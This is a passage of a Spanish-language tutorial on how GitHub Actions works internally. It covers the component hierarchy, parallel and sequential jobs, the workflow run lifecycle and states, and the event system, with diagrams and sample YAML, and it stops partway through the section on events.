# GITHUB ACTIONS: ARQUITECTURA Y FUNCIONAMIENTO TÉCNICO

## 📚 TABLA DE CONTENIDOS

1. [¿Qué es GitHub Actions? - Fundamentos](#1-qué-es-github-actions---fundamentos)
2. [Arquitectura del Sistema](#2-arquitectura-del-sistema)
3. [Ciclo de Vida Completo](#3-ciclo-de-vida-completo)
4. [Sistema de Eventos](#4-sistema-de-eventos)
5. [Runners: La Infraestructura de Ejecución](#5-runners-la-infraestructura-de-ejecución)
6. [Contextos: El Sistema de Variables](#6-contextos-el-sistema-de-variables)
7. [Expresiones y Motor de Evaluación](#7-expresiones-y-motor-de-evaluación)
8. [Sistema de Almacenamiento](#8-sistema-de-almacenamiento)
9. [Seguridad y Aislamiento](#9-seguridad-y-aislamiento)
10. [Networking y Comunicación](#10-networking-y-comunicación)

---

## 1. ¿QUÉ ES GITHUB ACTIONS? - FUNDAMENTOS

### Introducción: Automatización Nativa en GitHub

GitHub Actions es mucho más que una "herramienta de CI/CD". Es un **sistema completo de automatización** integrado directamente en GitHub que transforma tu repositorio en una plataforma de desarrollo completa.

**¿Qué problema resuelve GitHub Actions?**

Antes de GitHub Actions, el flujo de desarrollo era fragmentado:

```
Modelo Tradicional:
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│   GitHub     │ →   │  Jenkins/    │ →   │   AWS/       │
│   (código)   │     │  Travis CI   │     │   Heroku     │
│              │     │  (CI/CD)     │     │   (deploy)   │
└──────────────┘     └──────────────┘     └──────────────┘
   Separado            Separado             Separado

Problemas:
❌ Múltiples servicios que configurar
❌ Sincronización entre sistemas
❌ Credenciales en múltiples lugares
❌ Costo de múltiples servicios
❌ Complejidad de mantenimiento
```

```
Modelo con GitHub Actions:
┌────────────────────────────────────────────────────────┐
│                    GITHUB                              │
│  ┌────────────┐  ┌────────────┐  ┌────────────┐      │
│  │  Código    │  │   CI/CD    │  │   Deploy   │      │
│  │  (repo)    │  │  (Actions) │  │  (Actions) │      │
│  └────────────┘  └────────────┘  └────────────┘      │
│         TODO EN UN SOLO LUGAR                          │
└────────────────────────────────────────────────────────┘

Ventajas:
✓ Un solo servicio
✓ Integración nativa
✓ Credenciales centralizadas
✓ Un solo costo
✓ Mantenimiento simplificado
```

**¿Qué hace diferente a GitHub Actions?**

1. **Nativo de GitHub**: No es un servicio externo conectado por webhooks, es parte de GitHub
2. **Event-driven**: Reacciona a TODO lo que pasa en GitHub (no solo push)
3. **Matrix builds**: Ejecuta en múltiples OS/versiones en paralelo automáticamente
4. **Marketplace**: Miles de actions reutilizables de la comunidad
5. **Self-hosted runners**: Puedes usar tu propia infraestructura

**La filosofía de diseño**

GitHub Actions fue diseñado con tres principios:

1. **Declarativo sobre imperativo**: Describes QUÉ quieres, no CÓMO hacerlo
   ```yaml
   # Declarativo (GitHub Actions)
   - uses: actions/setup-node@v4
     with:
       node-version: 18
   # GitHub sabe CÓMO instalar Node.js
   
   # vs Imperativo (shell script tradicional)
   - run: |
       curl -o- https://nodejs.org/dist/v18.../...
       tar xzf ...
       export PATH=...
       # Tú defines cada paso
   ```

2. **Composable sobre monolítico**: Pequeñas piezas reutilizables (actions) en lugar de scripts grandes
   ```yaml
   # Composable
   - uses: actions/checkout@v4
   - uses: actions/setup-node@v4
   - uses: actions/cache@v4
   # Cada action hace UNA cosa bien
   
   # vs Monolítico
   - run: ./mega-script.sh
   # Un script gigante que hace todo
   ```

3. **Distribuido sobre centralizado**: Runners pueden estar en cualquier lugar
   ```
   GitHub-hosted: En la nube de GitHub
   Self-hosted: En tu datacenter
   Hybrid: Combinación de ambos
   ```

**¿Qué NO es GitHub Actions?**

Es importante aclarar malentendidos comunes:

```
❌ NO es solo para CI/CD
   (Puedes automatizar releases, issues, proyectos, etc.)

❌ NO es solo para código
   (Puedes automatizar documentación, notificaciones, etc.)

❌ NO requiere código
   (Hay actions para todo, puedes no escribir una línea de código)

❌ NO es lento
   (Con cache y optimización, puede ser más rápido que servicios dedicados)

❌ NO es caro
   (Repositorios públicos: gratis ilimitado)
```

**Casos de uso reales**

GitHub Actions va mucho más allá de "ejecutar tests":

```
CI/CD Tradicional:
✓ Ejecutar tests en cada push
✓ Compilar código
✓ Desplegar a producción

Automatización Avanzada:
✓ Cerrar issues inactivos automáticamente
✓ Etiquetar PRs según archivos modificados
✓ Generar documentación y publicarla
✓ Crear releases automáticos
✓ Sincronizar con sistemas externos
✓ Auditar seguridad (dependencias, CVEs)
✓ Notificar a Slack/Discord/Teams
✓ Actualizar proyectos/roadmaps
✓ Backup de datos
✓ Limpiar recursos
```

**El ecosistema**

GitHub Actions no existe en aislamiento:

```
┌────────────────────────────────────────────────┐
│  GITHUB ECOSYSTEM                              │
│                                                │
│  ┌──────────┐   ┌──────────┐   ┌──────────┐  │
│  │   Code   │   │ Actions  │   │ Packages │  │
│  │  Review  │←→ │ (CI/CD)  │→ │ (Docker) │  │
│  └──────────┘   └──────────┘   └──────────┘  │
│       ↑              ↓              ↓         │
│  ┌──────────┐   ┌──────────┐   ┌──────────┐  │
│  │   PRs    │   │ Security │   │  Pages   │  │
│  │  Issues  │   │  Audit   │   │  (deploy)│  │
│  └──────────┘   └──────────┘   └──────────┘  │
└────────────────────────────────────────────────┘

Todo está interconectado
```

**¿Por qué aprender la arquitectura?**

Puedes usar GitHub Actions sin entender cómo funciona (como manejar sin conocer el motor). Pero entender la arquitectura te da:

1. **Poder de debugging**: Sabes dónde buscar cuando algo falla
2. **Optimización**: Reduces tiempos de build de minutos a segundos
3. **Diseños avanzados**: Workflows complejos con dependencias, matrices, reutilización
4. **Solución de problemas**: No dependes de StackOverflow para todo
5. **Confianza**: Sabes qué es posible y qué no

**La diferencia entre "usar" y "dominar"**

```
USAR GitHub Actions:
- Copias ejemplos de internet
- Funciona pero no sabes por qué
- Si falla, no sabes cómo arreglarlo
- Workflows simples y lineales

DOMINAR GitHub Actions:
- Entiendes cada línea
- Sabes exactamente qué hace y cuándo
- Debuggeas rápido
- Workflows complejos, optimizados, reutilizables
```

Este documento te llevará de "usuario" a "experto" explicando no solo QUÉ hace cada componente, sino **CÓMO** y **POR QUÉ** funciona así.

---

### 1.1 Definición Técnica

GitHub Actions es un **sistema de automatización distribuido basado en eventos** que se ejecuta en la infraestructura de GitHub. Técnicamente es:

- Un **orquestador de tareas** (workflow orchestrator)
- Un **sistema event-driven** (reactivo a eventos)
- Una **plataforma de CI/CD** (Integración Continua/Despliegue Continuo)
- Un **motor de ejecución de contenedores** (runner system)

### 1.2 Componentes Principales

```
┌─────────────────────────────────────────────────────────────┐
│                      GITHUB.COM                              │
│  ┌────────────────────────────────────────────────────┐     │
│  │  1. REPOSITORIO (tu código + workflows)            │     │
│  └────────────────────────────────────────────────────┘     │
│                          ↓                                   │
│  ┌────────────────────────────────────────────────────┐     │
│  │  2. EVENT SYSTEM (detecta cambios/acciones)        │     │
│  └────────────────────────────────────────────────────┘     │
│                          ↓                                   │
│  ┌────────────────────────────────────────────────────┐     │
│  │  3. WORKFLOW ENGINE (procesa .yml, decide qué      │     │
│  │     ejecutar)                                      │     │
│  └────────────────────────────────────────────────────┘     │
│                          ↓                                   │
│  ┌────────────────────────────────────────────────────┐     │
│  │  4. JOB SCHEDULER (asigna jobs a runners)          │     │
│  └────────────────────────────────────────────────────┘     │
└──────────────────────────────┬──────────────────────────────┘
                               │
                               ↓
┌──────────────────────────────────────────────────────────────┐
│              5. RUNNERS (máquinas que ejecutan)              │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐          │
│  │ Runner 1    │  │ Runner 2    │  │ Runner N    │          │
│  │ (Ubuntu)    │  │ (Windows)   │  │ (macOS)     │          │
│  └─────────────┘  └─────────────┘  └─────────────┘          │
└──────────────────────────────────────────────────────────────┘
```

---

## 2. ARQUITECTURA DEL SISTEMA

### Introducción: La Jerarquía de Automatización

La **arquitectura de GitHub Actions** es como un sistema operativo: tiene múltiples capas, cada una con responsabilidades específicas. Entender esta jerarquía es crucial porque define cómo se organiza, ejecuta y escala tu automatización.

**¿Por qué GitHub Actions tiene esta arquitectura?**

GitHub Actions necesita resolver problemas complejos:

1. **Ejecutar miles de workflows simultáneamente** (escalabilidad)
2. **Aislar ejecuciones entre sí** (seguridad)
3. **Soportar múltiples sistemas operativos** (flexibilidad)
4. **Ser fácil de usar** (declarativo)
5. **Integrarse con Git** (eventos, commits, branches)

La arquitectura que veremos fue diseñada específicamente para resolver estos problemas.

**Los 5 niveles de la arquitectura**

```
┌─────────────────────────────────────────────────┐
│ NIVEL 1: REPOSITORIO                            │
│ - Tu código fuente                              │
│ - Directorio .github/workflows/                 │
│ - Archivos YAML de workflows                    │
└──────────────────┬──────────────────────────────┘
                   │ contiene
                   ▼
┌─────────────────────────────────────────────────┐
│ NIVEL 2: WORKFLOW                               │
│ - Archivo YAML (ej: ci.yml)                     │
│ - Define: cuándo, dónde, qué                    │
│ - Contiene múltiples jobs                       │
└──────────────────┬──────────────────────────────┘
                   │ contiene
                   ▼
┌─────────────────────────────────────────────────┐
│ NIVEL 3: JOB                                    │
│ - Unidad de ejecución independiente             │
│ - Se ejecuta en UNA máquina (runner)            │
│ - Puede tener dependencias (needs:)             │
└──────────────────┬──────────────────────────────┘
                   │ contiene
                   ▼
┌─────────────────────────────────────────────────┐
│ NIVEL 4: STEP                                   │
│ - Acción atómica                                │
│ - Ejecuta UNA action o comando                  │
│ - Comparte filesystem con otros steps           │
└──────────────────┬──────────────────────────────┘
                   │ ejecuta
                   ▼
┌─────────────────────────────────────────────────┐
│ NIVEL 5: ACTION/COMANDO                         │
│ - Código JavaScript/Docker/Composite            │
│ - O comando shell (run:)                        │
│ - Lo que realmente se ejecuta                   │
└─────────────────────────────────────────────────┘
```

**¿Por qué esta jerarquía es poderosa?**

Cada nivel tiene un propósito específico:

```
REPOSITORIO:
  Propósito: Organización física
  Puede tener: Múltiples workflows
  Ejemplo: Un repo puede tener workflows para CI, CD, releases, etc.

WORKFLOW:
  Propósito: Orquestación completa de una automatización
  Puede tener: Múltiples jobs
  Ejemplo: Un workflow "CI" con jobs de lint, test, build

JOB:
  Propósito: Unidad de paralelización
  Puede tener: Múltiples steps
  Ejemplo: Un job "test" que instala deps, ejecuta tests, genera reporte

STEP:
  Propósito: Acción atómica
  Puede tener: UNA action o comando
  Ejemplo: Un step que ejecuta "npm install"

ACTION:
  Propósito: Lógica reutilizable
  Puede tener: Código complejo
  Ejemplo: actions/checkout clona tu repositorio
```

**Ejemplo concreto de la jerarquía**

```yaml
# REPOSITORIO: usuario/mi-app
# ├── .github/
# │   └── workflows/
# │       └── ci.yml  ← WORKFLOW

name: CI Pipeline

on: push

jobs:              # ← Aquí empiezan los JOBS
  lint:            # ← JOB 1
    runs-on: ubuntu-latest
    steps:         # ← Aquí empiezan los STEPS
      - uses: actions/checkout@v4    # ← STEP 1 (usa una ACTION)
      - uses: actions/setup-node@v4  # ← STEP 2 (usa una ACTION)
        with:
          node-version: 18
      - run: npm install             # ← STEP 3 (ejecuta COMANDO)
      - run: npm run lint            # ← STEP 4 (ejecuta COMANDO)
  
  test:            # ← JOB 2 (puede ejecutar en PARALELO con lint)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - run: npm install
      - run: npm test
  
  build:           # ← JOB 3 (espera a lint y test)
    needs: [lint, test]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - run: npm install
      - run: npm run build
```

**Visualización de ejecución**

```
TIEMPO →

t=0s:  WORKFLOW "CI Pipeline" inicia
       ↓
       ┌─────────┐  ┌─────────┐
t=0s:  │  lint   │  │  test   │  ← Jobs en PARALELO
       │ Runner1 │  │ Runner2 │     (diferentes máquinas)
       └────┬────┘  └────┬────┘
            │            │
            │ Step 1: checkout
            │ Step 2: setup-node
            │ Step 3: npm install
            │ Step 4: npm run lint
            ↓
t=45s: lint termina
            │            │
            │            │ Step 1: checkout
            │            │ Step 2: setup-node
            │            │ Step 3: npm install
            │            │ Step 4: npm test
            │            ↓
t=60s:      │       test termina
            │            │
            └────────┬───┘
                     ↓
t=60s:         ┌─────────┐
               │  build  │  ← Job SECUENCIAL
               │ Runner3 │     (espera a lint y test)
               └────┬────┘
                    │
                    │ Step 1: checkout
                    │ Step 2: setup-node
                    │ Step 3: npm install
                    │ Step 4: npm run build
                    ↓
t=90s:         build termina
                    ↓
               WORKFLOW completo
```

**¿Qué ejecuta en paralelo y qué no?**

```
EN PARALELO:
✓ Jobs sin "needs:" entre sí
✓ Jobs en diferentes workflows
✓ Workflows en diferentes repos

SECUENCIAL (uno después de otro):
→ Steps dentro de un job (SIEMPRE secuencial)
→ Jobs con "needs:" (espera a dependencias)
→ Matrix jobs (pueden ser paralelos ENTRE SÍ)
```

**La relación entre Workflow y Workflow Run**

Esto confunde a muchos:

```
WORKFLOW (archivo .yml):
  = La PLANTILLA
  = Vive en tu repositorio
  = Define QUÉ hacer
  = Es estático (no cambia durante ejecución)
  
  Analogía: Receta de cocina escrita

WORKFLOW RUN (instancia):
  = Una EJECUCIÓN específica de esa plantilla
  = Se crea cada vez que se dispara el workflow
  = Tiene su propio ID, logs, resultados
  = Es dinámico (se ejecuta y termina)
  
  Analogía: Cocinar usando esa receta

Ejemplo:
  Workflow: .github/workflows/ci.yml
  
  Push 1 (10:00) → Workflow Run #1
  Push 2 (10:15) → Workflow Run #2
  Push 3 (10:30) → Workflow Run #3
  
  Mismo workflow, 3 ejecuciones diferentes
```

**El concepto de "Job"**

Un job es la **unidad de aislamiento** en GitHub Actions:

```
Cada job tiene:
✓ Su propio runner (máquina independiente)
✓ Su propio filesystem (no ve otros jobs)
✓ Sus propias variables de entorno
✓ Su propio estado (success/failure)

Jobs NO comparten:
✗ Filesystem
✗ Procesos
✗ Variables de entorno (excepto outputs explícitos)
✗ Cache (a menos que uses actions/cache)

Para compartir datos entre jobs:
→ Usa "outputs" (para strings pequeños)
→ Usa "artifacts" (para archivos)
→ Usa "cache" (para dependencias)
```

**El concepto de "Step"**

Un step es la **unidad de ejecución** dentro de un job:

```
Steps dentro de un job SÍ comparten:
✓ Filesystem (archivos creados persisten)
✓ Variables de entorno (con env:)
✓ Working directory
✓ Procesos en background

Steps se ejecutan:
→ SIEMPRE secuencialmente
→ En el MISMO runner
→ Uno tras otro

Si un step falla:
→ Los siguientes NO se ejecutan
→ El job se marca como "failure"
→ EXCEPTO si usas "continue-on-error: true"
```

**Composición vs Herencia**

GitHub Actions usa **composición** (no herencia):

```
Composición (GitHub Actions):
  Workflow = job1 + job2 + job3
  Job = step1 + step2 + step3
  Step = action o comando
  
  Beneficios:
  ✓ Reutilización fácil
  ✓ Modular
  ✓ Fácil de entender

Herencia (otros sistemas):
  WorkflowBase
    ├─ CIWorkflow extends WorkflowBase
    ├─ CDWorkflow extends WorkflowBase
    └─ TestWorkflow extends CIWorkflow
  
  Problemas:
  ✗ Complejo
  ✗ Difícil de depurar
  ✗ Acoplamiento
```

**El poder de la arquitectura modular**

Esta arquitectura permite patrones poderosos:

```
PATRÓN 1: Fan-out / Fan-in
  ┌───┐
  │ A │  (un job)
  └─┬─┘
    ├─────────┬─────────┐
    ↓         ↓         ↓
  ┌───┐    ┌───┐    ┌───┐
  │ B │    │ C │    │ D │  (múltiples jobs en paralelo)
  └─┬─┘    └─┬─┘    └─┬─┘
    └─────────┼─────────┘
              ↓
            ┌───┐
            │ E │  (consolida resultados)
            └───┘

PATRÓN 2: Pipeline
  ┌───┐  →  ┌───┐  →  ┌───┐  →  ┌───┐
  │ A │     │ B │     │ C │     │ D │
  └───┘     └───┘     └───┘     └───┘

PATRÓN 3: Matriz
       ┌──────┬──────┬──────┐
       │ A(1) │ A(2) │ A(3) │  (mismo job, diferentes configs)
       └──────┴──────┴──────┘
```

**¿Por qué entender la arquitectura importa?**

1. **Diseñar workflows eficientes**: Paralelización correcta
2. **Debugging efectivo**: Sabes dónde buscar problemas
3. **Optimización**: Reducir tiempos y costos
4. **Reutilización**: Crear workflows modulares
5. **Escalabilidad**: Workflows que crecen sin romperse

La arquitectura de GitHub Actions no es arbitraria: cada nivel existe por una razón técnica específica. Entenderla te da el poder de usarla correctamente.

---

### 2.1 Jerarquía de Componentes

```
REPOSITORIO
    │
    └─── .github/workflows/
            │
            ├─── workflow1.yml  ← WORKFLOW (archivo de configuración)
            │       │
            │       ├─── on:    ← TRIGGERS (cuándo ejecutar)
            │       │
            │       └─── jobs:  ← JOBS (trabajos independientes)
            │               │
            │               ├─── job1:
            │               │      ├─── runs-on:  ← RUNNER (dónde ejecutar)
            │               │      └─── steps:    ← STEPS (comandos)
            │               │             ├─── step1
            │               │             ├─── step2
            │               │             └─── step3
            │               │
            │               └─── job2:
            │                      ├─── needs: [job1]  ← DEPENDENCIAS
            │                      └─── steps: [...]
            │
            └─── workflow2.yml
```

### 2.2 Relación Entre Componentes

**WORKFLOW = Orquestación completa**
- Es un archivo YAML
- Define CUÁNDO, DÓNDE y QUÉ ejecutar
- Puede tener múltiples JOBS

**JOB = Unidad de ejecución independiente**
- Se ejecuta en UN runner (una máquina)
- Contiene múltiples STEPS
- Puede depender de otros jobs (secuencial) o ejecutarse en paralelo

**STEP = Acción atómica**
- Ejecuta UN comando o UNA action
- Comparte el filesystem con otros steps del mismo job
- Se ejecuta secuencialmente dentro del job

**RUNNER = Máquina física/virtual**
- Ambiente limpio para cada job
- Sistema operativo específico (Ubuntu, Windows, macOS)
- Ejecuta los comandos reales

---

## 3. CICLO DE VIDA COMPLETO

### Introducción: Del Evento a la Ejecución

Entender el **ciclo de vida completo** de un workflow es fundamental para dominar GitHub Actions. No se trata solo de escribir un archivo YAML y esperar que funcione: hay un proceso complejo y fascinante que ocurre entre el momento en que haces `git push` y el momento en que ves el resultado en GitHub.

**¿Por qué es importante entender esto?**

Cuando comprendes el ciclo de vida completo:
1. **Debuggear es más fácil**: Sabes en qué fase falló algo
2. **Optimizar es posible**: Entiendes dónde están los cuellos de botella
3. **Diseñar mejor**: Sabes qué es posible y qué no
4. **Troubleshooting**: Puedes identificar si el problema está en el evento, el runner, o el código

**El viaje de un workflow: Vista general**

```
Tu acción local → Servidor GitHub → Workflow Engine → Runner → Resultado

Tiempo típico: segundos a minutos
Pasos involucrados: 7 fases principales
Componentes: 5+ sistemas de GitHub
```

**Las 7 fases del ciclo de vida:**

1. **Detección de Evento**: GitHub detecta que algo pasó
2. **Evaluación de Workflows**: ¿Qué workflows deben ejecutarse?
3. **Creación de Workflow Run**: Se crea una instancia de ejecución
4. **Planificación de Jobs**: Se determina el orden de ejecución
5. **Asignación de Runners**: Se buscan máquinas disponibles
6. **Ejecución en el Runner**: Se ejecuta el código
7. **Reporte de Resultados**: Se muestran los resultados

**¿Qué hace que este sistema sea poderoso?**

GitHub Actions no es solo "ejecutar comandos". Es un **sistema distribuido de orquestación** con:

- **Paralelización automática**: Jobs independientes se ejecutan simultáneamente
- **Gestión de dependencias**: Jobs pueden esperar a otros (needs:)
- **Aislamiento**: Cada job tiene su propia máquina limpia
- **Escalabilidad**: Miles de workflows pueden ejecutarse a la vez
- **Resiliencia**: Si un runner falla, el job se reasigna a otro
- **Trazabilidad**: Cada paso se registra con timestamp y logs

**El concepto de "Workflow Run"**

Cada vez que un workflow se ejecuta, GitHub crea una **Workflow Run** (instancia de ejecución). Piensa en esto como:

```
Workflow (archivo .yml):
  = Receta / Plantilla
  = Define QUÉ hacer
  = Vive en tu repositorio

Workflow Run (instancia):
  = Ejecución específica de esa receta
  = Tiene un ID único
  = Tiene su propio conjunto de logs
  = Puede ejecutarse múltiples veces del mismo workflow

Analogía:
  Workflow = Clase en programación
  Workflow Run = Instancia de esa clase
```

**Ejemplo concreto:**

```yaml
# .github/workflows/ci.yml (EL WORKFLOW)
name: CI
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Testing"
```

```
Cuando haces push 3 veces:
  → Se crean 3 Workflow Runs diferentes
  → Cada uno con su propio ID
  → Run #1: Ejecutado a las 10:00
  → Run #2: Ejecutado a las 10:15
  → Run #3: Ejecutado a las 10:30

Todos usan el MISMO workflow (ci.yml)
Pero cada uno es una ejecución independiente
```

**El estado del Workflow Run**

Durante su ciclo de vida, un Workflow Run pasa por varios estados:

```
queued → in_progress → completed
                           ↓
                    ┌──────┴──────┬──────────┐
                    ↓             ↓          ↓
                 success      failure    cancelled
```

**¿Por qué hay una fase de "queued"?**

GitHub Actions es un sistema **compartido**. Hay recursos limitados:
- Los GitHub-hosted runners tienen límites de concurrencia
- Puedes tener múltiples workflows ejecutándose simultáneamente
- Si todos los runners están ocupados, tu workflow espera en cola

```
Ejemplo:
  10:00 - Haces push → Workflow entra en "queued"
  10:01 - Se libera un runner → Workflow pasa a "in_progress"
  10:05 - Termina ejecución → Workflow pasa a "completed" + "success"

Tiempo total: 5 minutos
Tiempo en cola: 1 minuto
Tiempo ejecutando: 4 minutos
```

**La importancia de la fase de evaluación**

No todos los eventos disparan todos los workflows. GitHub hace una **evaluación inteligente**:

```yaml
# Workflow A: Solo se ejecuta en push a main
on:
  push:
    branches: [main]

# Workflow B: Solo se ejecuta en pull requests
on: pull_request

# Workflow C: Se ejecuta en push a cualquier rama
on: push
```

```
Acción: git push origin feature-x

Evaluación de GitHub:
  Workflow A: ❌ No se ejecuta (no es main)
  Workflow B: ❌ No se ejecuta (no es pull request)
  Workflow C: ✅ Se ejecuta (es un push)

Solo se crea 1 Workflow Run (del Workflow C)
```

**La fase de planificación: El grafo de dependencias**

GitHub Actions analiza las dependencias entre jobs y crea un **grafo de ejecución**:

```yaml
jobs:
  lint:
    runs-on: ubuntu-latest
    steps: [...]
  
  test:
    runs-on: ubuntu-latest
    steps: [...]
  
  build:
    needs: [lint, test]  # Depende de lint Y test
    runs-on: ubuntu-latest
    steps: [...]
  
  deploy:
    needs: [build]  # Depende de build
    runs-on: ubuntu-latest
    steps: [...]
```

```
Grafo de ejecución:

       lint ────┐
                ├──> build ──> deploy
       test ────┘

Ejecución en paralelo:
  t=0s:  lint y test empiezan simultáneamente
  t=30s: lint termina
  t=45s: test termina
  t=45s: build empieza (esperó a ambos)
  t=60s: build termina
  t=60s: deploy empieza
  t=75s: deploy termina

Tiempo total: 75s
(Sin paralelización serían: 30+45+15+15 = 105s)
```

**¿Qué pasa realmente en el Runner?**

El runner no es solo "una máquina que ejecuta comandos". Es un **entorno completo y aislado**:

```
SETUP (antes de tus comandos):
  1. VM/Container limpio (filesystem vacío)
  2. Sistema operativo instalado (Ubuntu/Windows/macOS)
  3. Herramientas pre-instaladas:
     - Git, Node.js, Python, Docker, etc.
     - Variables de entorno de GitHub
     - Credenciales de autenticación
  4. Directorio de trabajo preparado

TU CÓDIGO (tus steps):
  - Cada step se ejecuta en orden
  - Pueden usar actions (código reutilizable)
  - Pueden ejecutar comandos shell
  - Comparten el mismo filesystem
  - Comparten las mismas variables de entorno

TEARDOWN (después de tus comandos):
  1. Subir artifacts (si configuraste)
  2. Subir logs completos
  3. Limpiar credenciales
  4. Destruir el entorno completamente
```

**¿Por qué el "teardown" es importante?**

Seguridad y aislamiento:
- Cada ejecución es un ambiente fresco
- No hay "residuos" de ejecuciones anteriores
- Credenciales no persisten
- Ningún otro usuario puede acceder a tus datos

**El sistema de logs: Cómo ves lo que pasa**

Cada línea que tus comandos escriben a stdout/stderr se captura:

```bash
# Tu comando
echo "Building project..."
npm run build

# Lo que GitHub captura:
[timestamp] Building project...
[timestamp] > project@1.0.0 build
[timestamp] > webpack --mode production
[timestamp] Hash: abc123
[timestamp] Built at: 10:05:30
[timestamp] Assets:
[timestamp]   main.js  1.2 MB  [emitted]
```

Cada línea tiene:
- Timestamp exacto
- Output del comando
- Código de salida (exit code)

**Resultado final: El "Check"**

Al terminar, GitHub crea un **check** en el commit:

```
Commit abc123: "Add new feature"
  ✓ CI (workflow exitoso)
  ✗ Lint (workflow falló)
  ⊙ Deploy (workflow en progreso)
```

Estos checks:
- Aparecen en pull requests
- Bloquean merges (si configuraste branch protection)
- Envían notificaciones
- Quedan en el historial permanentemente

Ahora veamos cada fase en detalle.

---

### 3.1 Flujo Detallado

```
FASE 1: DETECCIÓN DE EVENTO
───────────────────────────────
Usuario hace: git push
    ↓
GitHub detecta el evento "push"
    ↓
GitHub genera un PAYLOAD (objeto JSON con toda la info del evento)
    ↓
Payload contiene:
  - Qué tipo de evento es (push)
  - Quién lo hizo (autor)
  - Qué cambió (commits, archivos)
  - Contexto del repo (branch, SHA, etc.)


FASE 2: EVALUACIÓN DE WORKFLOWS
────────────────────────────────
GitHub busca en .github/workflows/*.yml
    ↓
Para cada archivo .yml:
  ┌─ Lee el campo "on:"
  ┌─ ¿Este workflow escucha el evento "push"?
  │   ├─ NO → Ignora este workflow
  │   └─ SÍ → Continúa evaluación
  │
  ┌─ ¿Hay filtros (branches, paths)?
  │   └─ Evalúa si el push cumple las condiciones
  │
  └─ SI TODO CUMPLE → Encola el workflow para ejecución


FASE 3: CREACIÓN DE WORKFLOW RUN
─────────────────────────────────
GitHub crea una "Workflow Run" (instancia de ejecución)
    ↓
Asigna un ID único: run_id
    ↓
Estado inicial: "queued"
    ↓
Genera el contexto global (github.*, env.*, etc.)


FASE 4: PLANIFICACIÓN DE JOBS
──────────────────────────────
Lee la sección "jobs:" del workflow
    ↓
Analiza dependencias (needs:)
    ↓
Crea un grafo de ejecución:
  job1 (sin dependencias) → puede ejecutar YA
  job2 (needs: job1)      → espera a que job1 termine
  job3 (sin dependencias) → puede ejecutar en PARALELO con job1


FASE 5: ASIGNACIÓN DE RUNNERS
──────────────────────────────
Para cada job listo para ejecutar:
    ↓
Lee "runs-on:" (ej: ubuntu-latest)
    ↓
Busca un runner disponible con ese OS
    ↓
SI HAY RUNNER LIBRE:
  └─ Asigna el job al runner
     Estado del job: "in_progress"
SINO:
  └─ Job queda en cola
     Estado del job: "queued"


FASE 6: EJECUCIÓN EN EL RUNNER
───────────────────────────────
El runner recibe el job
    ↓
1. SETUP INICIAL
   - Crea un directorio de trabajo limpio
   - Descarga las herramientas del sistema (node, python, etc.)
   - Prepara variables de entorno
   
2. SETUP DE ACTIONS (si usa actions/checkout@v4, etc.)
   - Descarga el código de la action desde su repo
   - Instala dependencias de la action
   
3. EJECUCIÓN STEP BY STEP
   Paso 1: actions/checkout@v4
     ↓
   - Clona tu repositorio en el runner
   - Checkout al commit específico (SHA del evento)
   
   Paso 2: run: npm install
     ↓
   - Abre una shell (bash/powershell)
   - Ejecuta el comando
   - Captura stdout, stderr, exit code
   
   Paso 3: run: npm test
     ↓
   - Ejecuta en la MISMA máquina (filesystem compartido)
   - Si exit code != 0 → FALLA
   
4. LIMPIEZA
   - Sube artifacts (si hay)
   - Sube logs
   - Destruye el ambiente


FASE 7: REPORTE DE RESULTADOS
──────────────────────────────
Runner envía resultado a GitHub:
  - Estado: success / failure / cancelled
  - Logs completos
  - Duración
    ↓
GitHub actualiza el estado del job
    ↓
Si era el último job → Workflow completo
    ↓
Notificaciones:
  - Checks en el commit (✓ o ✗)
  - Emails (si configurado)
  - Webhooks (si configurado)
```

### 3.2 Estados del Workflow

```
┌─────────┐
│ queued  │  ← Esperando un runner
└────┬────┘
     │
     ↓
┌─────────────┐
│ in_progress │  ← Ejecutándose
└────┬────────┘
     │
     ├─────────────────┬─────────────────┐
     ↓                 ↓                 ↓
┌─────────┐    ┌──────────┐    ┌───────────┐
│ success │    │ failure  │    │ cancelled │
└─────────┘    └──────────┘    └───────────┘
```

---

## 4. SISTEMA DE EVENTOS

### Introducción: El Corazón Reactivo de GitHub Actions

El **sistema de eventos** es lo que hace que GitHub Actions sea **reactivo** en lugar de manual. Sin eventos, tendrías que ejecutar tus workflows manualmente cada vez. Con eventos, GitHub Actions reacciona automáticamente a lo que sucede en tu repositorio.

**¿Qué es realmente un evento?**

Un evento NO es solo "algo que pasó". Técnicamente es:

1. **Una señal digital**: GitHub detecta una acción y crea un objeto de datos
2. **Un webhook interno**: Similar a webhooks externos, pero dentro de GitHub
3. **Un payload JSON**: Contiene toda la información del evento
4. **Un disparador**: Activa la evaluación de workflows

**La arquitectura event-driven**

GitHub Actions usa una arquitectura **event-driven** (dirigida por eventos):

```
Arquitectura Tradicional (polling):
┌──────────────────────────────┐
│ Sistema revisa cada minuto:  │
│ "¿Hay algo nuevo?"           │
│ "¿Hay algo nuevo?"           │
│ "¿Hay algo nuevo?"           │
└──────────────────────────────┘
Problemas:
- Desperdicia recursos
- Delay de hasta 1 minuto
- No escala bien

Arquitectura Event-Driven (GitHub Actions):
┌──────────────────────────────┐
│ EVENTO OCURRE                │
│      ↓                       │
│ Sistema reacciona            │
│ INMEDIATAMENTE               │
└──────────────────────────────┘
Ventajas:
✓ Reacción instantánea
✓ Solo usa recursos cuando necesita
✓ Escala infinitamente
```

**¿Quién genera los eventos?**

Esta es una pregunta crucial que muchos no entienden:

```
❌ INCORRECTO:
"Tu máquina local genera el evento cuando haces git push"

✅ CORRECTO:
"GitHub.com (el servidor) genera el evento después de procesar tu push"
```

**El flujo real:**

```
1. TU MÁQUINA LOCAL:
   $ git push origin main
   ↓
   Envía commits al servidor de GitHub
   (Tu máquina NO sabe nada de GitHub Actions)

2. GITHUB.COM (SERVIDOR):
   Recibe los commits
   ↓
   Actualiza la base de datos del repositorio
   ↓
   DETECTA: "Hubo un cambio en este repo"
   ↓
   GENERA EVENTO: {
     type: "push",
     repository: "user/repo",
     ref: "refs/heads/main",
     commits: [...]
   }
   ↓
   Envía el evento al sistema de Workflow Engine

3. WORKFLOW ENGINE:
   Recibe el evento
   ↓
   Busca workflows que escuchan "push"
   ↓
   Ejecuta los workflows que cumplen condiciones
```

**¿Por qué esta distinción importa?**

Porque entiendes:
